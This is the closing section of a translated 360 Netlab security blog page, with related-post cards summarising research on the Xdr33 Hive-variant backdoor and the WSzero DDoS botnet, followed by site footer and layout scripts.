         <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24">
          <path d="M13 14.5s2 3 5 3 5.5-2.463 5.5-5.5S21 6.5 18 6.5c-5 0-7 11-12 11C2.962 17.5.5 15.037.5 12S3 6.5 6 6.5s4.5 3.5 4.5 3.5" />
         </svg>
        </div>
        <div class="read-more-card-content">
         <ul>
          <li><a href="https://blog-netlab-360-com.translate.goog/911s5/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp">僵尸网络911 S5的数字遗产</a></li>
          <li><a href="https://blog-netlab-360-com.translate.goog/headsup_xdr33_variant_of_ciahive_emeerges/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp">Heads up! Xdr33, A Variant Of CIA’s HIVE Attack Kit Emerges</a></li>
          <li><a href="https://blog-netlab-360-com.translate.goog/new-ddos-botnet-wszeor/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp">快讯：使用21个漏洞传播的DDoS家族WSzero已经发展到第4个版本</a></li>
         </ul>
        </div>
        <footer class="read-more-card-footer"><a href="https://blog-netlab-360-com.translate.goog/tag/botnet/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp">See all 114 posts →</a>
        </footer>
       </article>
       <article class="post-card post tag-botnet tag-backdoor tag-cia-hive tag-en no-image">
        <div class="post-card-content"><a class="post-card-content-link" href="https://blog-netlab-360-com.translate.goog/headsup_xdr33_variant_of_ciahive_emeerges/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp">
          <header class="post-card-header">
           <div class="post-card-tags"><span class="post-card-primary-tag">Botnet</span>
           </div>
           <h2 class="post-card-title">Heads up! Xdr33, A Variant Of CIA’s HIVE Attack Kit Emerges</h2>
          </header>
          <div class="post-card-excerpt">
           Overview On Oct 21, 2022, 360Netlab's honeypot system captured a suspicious ELF file ee07a74d12c0bb3594965b51d0e45b6f, which propagated via F5 vulnerability with zero VT detection, our system observces that it communicates with IP 45.9.150.144 using SSL with forged Kaspersky certificates, this caught our attention. After further lookup,
          </div></a>
         <footer class="post-card-meta">
          <ul class="author-list">
           <li class="author-list-item">
            <div class="author-name-tooltip">
             Alex.Turing
            </div><a href="https://blog-netlab-360-com.translate.goog/author/alex/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp" class="static-avatar"> <img class="author-profile-image" src="/content/images/2019/06/turing.PNG" alt="Alex.Turing"> </a></li>
           <li class="author-list-item">
            <div class="author-name-tooltip">
             Hui Wang
            </div><a href="https://blog-netlab-360-com.translate.goog/author/huiwang/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp" class="static-avatar"> <img class="author-profile-image" src="/content/images/2017/05/WechatIMG1.jpeg" alt="Hui Wang"> </a></li>
          </ul><time class="post-card-meta-date" datetime=" 2023-01-10">Jan 10, 2023</time> <span class="post-card-meta-length">13 min read</span>
         </footer>
        </div>
       </article>
       <article class="post-card post tag-botnet tag-ddos tag-import-2022-11-30-11-16 no-image">
        <div class="post-card-content"><a class="post-card-content-link" href="https://blog-netlab-360-com.translate.goog/new-ddos-botnet-wszeor/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp">
          <header class="post-card-header">
           <div class="post-card-tags"><span class="post-card-primary-tag">Botnet</span>
           </div>
           <h2 class="post-card-title">快讯：使用21个漏洞传播的DDoS家族WSzero已经发展到第4个版本</h2>
          </header>
          <div class="post-card-excerpt">
           概述 近期，我们的BotMon系统连续捕获到一个由Go编写的DDoS类型的僵尸网络家族，它用于DDoS攻击，使用了包括SSH/Telnet弱口令在内的多达22种传播方式。短时间内出现了4个不同的版本，有鉴于此，我们觉得该家族未来很可能继续活跃，值得警惕。下面从传播、样本和跟踪角度分别介绍。 传播分析 除了Telnet/SSH弱口令，我们观察到wszero还使用了如下21个漏洞进行传播： VULNERABILITY AFFECTED CVE_2014_08361 Realtek SDK CVE_2017_17106 Zivif Webcams CVE_2017_17215 Huawei HG532 CVE_2018_12613 phpMyAdmin 4.8.x before 4.8.2 CVE_2020_10987 Tenda AC15 AC1900
          </div></a>
         <footer class="post-card-meta">
          <ul class="author-list">
           <li class="author-list-item">
            <div class="author-name-tooltip">
             Hui Wang
            </div><a href="https://blog-netlab-360-com.translate.goog/author/huiwang/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp" class="static-avatar"> <img class="author-profile-image" src="/content/images/2017/05/WechatIMG1.jpeg" alt="Hui Wang"> </a></li>
           <li class="author-list-item">
            <div class="author-name-tooltip">
             Alex.Turing
            </div><a href="https://blog-netlab-360-com.translate.goog/author/alex/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp" class="static-avatar"> <img class="author-profile-image" src="/content/images/2019/06/turing.PNG" alt="Alex.Turing"> </a></li>
          </ul><time class="post-card-meta-date" datetime=" 2022-12-07">Dec 7, 2022</time> <span class="post-card-meta-length">7 min read</span>
         </footer>
        </div>
       </article>
      </div>
     </div>
    </aside>
   </div>
   <footer class="site-footer outer">
    <div class="inner">
     <section class="copyright">
      <a href="https://blog-netlab-360-com.translate.goog/warning-hive-variant-xdr33-is-coming_cn/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp">360 Netlab Blog - Network Security Research Lab at 360</a> © 2024
     </section>
     <div>
      <a href="https://translate.google.com/website?sl=auto&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a>
     </div>
    </div>
   </footer>
  </div>
  <script src="https://code.jquery.com/jquery-3.5.1.min.js" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous">
</script>
  <script src="/assets/built/casper.js?v=42b57cac00"></script>
  <script>
$(document).ready(function () {
    // Mobile Menu Trigger
    $('.gh-burger').click(function () {
        $('body').toggleClass('gh-head-open');
    });
    // FitVids - Makes video embeds responsive
    $(".gh-content").fitVids();

    // floating-header
    // Start fitVids
      var $postContent = $(".gh-content");
      $postContent.fitVids();
      // End fitVids

      var progressBar = document.querySelector('#reading-progress');
      var header = document.querySelector('.floating-header');
      var title = document.querySelector('.article-title');

      var lastScrollY = window.scrollY;
      var lastWindowHeight = window.innerHeight;
      var lastDocumentHeight = $(document).height();
      var ticking = false;

      function onScroll() {
        lastScrollY = window.scrollY;
        requestTick();
      }

      function onResize() {
        lastWindowHeight = window.innerHeight;
        lastDocumentHeight = $(document).height();
        requestTick();
      }

      function requestTick() {
        if (!ticking) {
          requestAnimationFrame(update);
        }
        ticking = true;
      }

      function update() {
        var trigger = title.getBoundingClientRect().top + window.scrollY;
        var triggerOffset = title.offsetHeight + 35;
        var progressMax = lastDocumentHeight - lastWindowHeight;

        // show/hide floating header
        if (lastScrollY >= trigger + triggerOffset) {
          header.classList.add('floating-active');
        } else {
          header.classList.remove('floating-active');
        }

        progressBar.setAttribute('max', progressMax);
        progressBar.setAttribute('value', lastScrollY);

        ticking = false;
      }

      window.addEventListener('scroll', onScroll, { passive: true });
      window.addEventListener('resize', onResize, false);

      update();
});
</script>
  <script>function gtElInit() {var lib = new google.translate.TranslateService();lib.translatePage('zh-CN', 'en', function () {});}</script>
  <script src="https://translate.google.com/translate_a/element.js?cb=gtElInit&amp;hl=en&amp;client=wt" type="text/javascript"></script>
 </body>
</html>